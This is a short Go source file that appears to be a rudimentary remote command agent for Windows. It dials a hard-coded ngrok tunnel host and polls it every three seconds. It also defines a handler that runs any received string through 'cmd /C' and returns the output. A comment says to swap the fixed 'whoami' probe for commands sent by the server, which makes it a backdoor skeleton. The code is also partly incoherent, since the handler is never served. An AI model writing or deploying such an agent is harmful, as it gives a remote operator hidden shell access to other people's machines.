package main

import (
	"context"
	"log"
	"os/exec"
	"time"

	"github.com/cardfaux/windows-connect/grpcapi"
	"google.golang.org/grpc"
)

type clientServer struct {
	grpcapi.UnimplementedEchoServiceServer
}

func (c *clientServer) ExecuteCommand(ctx context.Context, req *grpcapi.CommandRequest) (*grpcapi.CommandResponse, error) {
	log.Printf("Executing command: %s", req.Command)

	// Execute command
	cmd := exec.Command("cmd", "/C", req.Command) // For Windows
	output, err := cmd.CombinedOutput()

	resp := &grpcapi.CommandResponse{
		Output: string(output),
	}
	if err != nil {
		resp.Error = err.Error()
	}

	return resp, nil
}

func main() {
	// Client connects to the gRPC server
	conn, err := grpc.Dial("6.tcp.ngrok.io:17905", grpc.WithInsecure())
	if err != nil {
		log.Fatalf("Failed to connect: %v", err)
	}
	defer conn.Close()

	log.Println("Connected to command server.")

	// Register the service on the client side (this is a bit backward but allows a polling loop)
	client := grpcapi.NewEchoServiceClient(conn)

	// Keep polling the server for new commands (or implement streaming for better efficiency)
	for {
		time.Sleep(3 * time.Second) // polling delay

		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()

		resp, err := client.ExecuteCommand(ctx, &grpcapi.CommandRequest{Command: "whoami"}) // Replace this logic with server-sent commands
		if err != nil {
			log.Println("Command error:", err)
			continue
		}

		log.Printf("Server response:\nOutput: %s\nError: %s\n", resp.Output, resp.Error)
	}
}
